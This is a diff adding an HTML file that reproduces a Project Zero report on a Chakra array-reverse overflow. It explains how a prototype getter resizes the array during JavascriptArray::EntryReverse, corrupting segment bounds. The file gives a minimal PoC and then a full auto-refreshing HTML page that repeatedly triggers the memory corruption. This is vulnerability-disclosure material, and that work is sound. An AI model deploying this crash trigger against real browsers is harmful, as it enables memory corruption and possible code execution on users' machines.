@@ -1,0 +1,82 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=925
+
+There is an overflow when reversing arrays in Chakra.
+
+On line 5112 of JavascriptArray::EntryReverse, the length of the array is fetched and stored. It is then passed as a parameter into JavascriptArray::ReverseHelper, which then calls FillFromPrototypes, which can change the size of the array. If the size of the array is set to be larger than it was when the length was fetched, the calculation of the array segment head left value on line 5219:
+
+     seg->left = ((uint32)length) - (seg->left + seg->length);
+
+Can become a very large value (as length is larger than seg->length and seg->left is generally 0). This can cause the segment length to become larger than the segment size the next time SparseArraySegmentBase::EnsureSizeInBound is called, as the method contains the following code:
+
+        uint32 nextLeft = next ? next->left : JavascriptArray::MaxArrayLength;
+        Assert(nextLeft > left);
+
+        if(size != 0)
+        {
+
+            size = min(size, nextLeft - left);
+        }
+
+nextLeft can be smaller than the segment length if next is null and left is very large, leading size to be set to a small value which is less than the segment length. Many other methods, including setting an element of an array assume that size is less than length, and often allocate size bytes then copy length bytes, leading to an overflow if length is actually more than size.
+
+A minimal PoC is as follows:
+
+var a = [1];
+a.length = 1000;
+var j = [];
+
+var o = {};
+  Object.defineProperty(o, '1', {
+    get: function() {
+      a.length = 1002;
+      j.fill.call(a, 7.7);
+      return 2;
+    }
+  });
+
+a.__proto__ = o;
+
+var r = j.reverse.call(a);
+r.length = 0xfffffffe;
+r[0xfffffffe - 1] = 10;
+
+A full PoC is attached. Note that this PoC sometimes needs to be refreshed a few times to cause a crash.
+-->
+
+<html>
+<head><meta http-equiv="refresh" content="1">
+</head>
+<body>
+<script>
+
+var a = [1];
+a.length = 1000;
+var j = [];
+
+
+var o = {};
+  Object.defineProperty(o, '1', {
+    get: function() {
+      //alert('get!');
+      a.length = 1002;
+      j.fill.call(a, 7.7);
+      return 2;
+    }
+  });
+
+a.__proto__ = o;
+
+var place = [];
+for(var i = 0; i < 10; i++){
+var r = j.reverse.call(a);
+r.length = 0xfffffffe;
+r[0xfffffffe - 1] = 10;
+var q = [1,2,3,4,5,6,7,8,9,10];
+place.push(q);
+}
+//alert(place.join());
+
+</script>
+</body>
+</html>
